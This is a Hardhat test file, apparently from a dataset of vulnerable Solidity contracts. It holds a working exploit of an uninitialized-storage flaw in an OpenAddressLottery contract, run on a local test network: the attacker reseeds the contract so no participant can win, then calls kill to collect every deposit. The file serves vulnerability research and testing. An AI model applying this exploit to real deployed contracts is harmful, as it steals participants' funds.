const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');
const path = require("path");
const fs = require("fs");

describe('attack other/open_address_lottery.sol', function () {
  let attacker, participant;
    async function deployContracts() {
      [attacker, participant] = await ethers.getSigners();
      const codePath = path.join(__dirname, '../../artifacts/contracts/dataset/other/open_address_lottery.sol/OpenAddressLottery.json');
      const json = JSON.parse(fs.readFileSync(codePath));
      const OpenAddressLottery = await ethers.getContractFactory(json.abi, json.bytecode);
      const contract = await OpenAddressLottery.deploy();  
      await contract.connect(attacker).waitForDeployment();
      return {contract};
    }

    it('sanity check: other/open_address_lottery.sol', async function () {
      const {contract} = await loadFixture(deployContracts);
      await expect(contract.luckyNumberOfAddress(contract.target)).to.not.be.reverted;
    });
  
    it('exploit uninitialized storage vulnerability', async function () {
      const {contract} = await loadFixture(deployContracts);
      const attackerBalanceBefore = await ethers.provider.getBalance(attacker.address);

      const amount = ethers.parseEther("1");
      const tx0 = await attacker.sendTransaction({to: contract.target, value: amount});
      const receipt0 = await tx0.wait();

      const contractBalance = await ethers.provider.getBalance(contract.target);
      expect(contractBalance).to.be.equal(amount);

      const storage = await ethers.provider.getStorage(contract.target, 3);
      const value = Number(storage);
      expect(value).to.be.equal(7);

      const tx1 = await contract.connect(attacker).forceReseed();     
      const receipt1 = await tx1.wait(); 
      const storageAfter = await ethers.provider.getStorage(contract.target, 3);
      const valueAfter = Number(storageAfter);
      expect(valueAfter).to.be.gt(8);

      //no participant will ever win any prize
      const participantBalanceBefore = await ethers.provider.getBalance(participant.address);
      const price = ethers.parseEther("0.1");
      const tx2 = await contract.connect(participant).participate({value: price});
      const receipt2 = await tx2.wait();
      const participantBalanceAfter = await ethers.provider.getBalance(participant.address);
      expect(participantBalanceAfter).to.be.equal(participantBalanceBefore - receipt2.gasUsed * receipt2.gasPrice - price);

      const contractBalanceAfter = await ethers.provider.getBalance(contract.target);
      expect(contractBalanceAfter).to.be.equal(amount + price);

      // attacker destroys the contract and gets all the money
      const tx3 = await contract.connect(attacker).kill();
      const receipt3 = await tx3.wait();
      const attackerBalanceAfter = await ethers.provider.getBalance(attacker.address);
      expect(attackerBalanceAfter).to.be.equal(attackerBalanceBefore - receipt0.gasUsed * receipt0.gasPrice
                                                                     - receipt1.gasUsed * receipt1.gasPrice
                                                                     - receipt3.gasUsed * receipt3.gasPrice + price);
      
    });
  });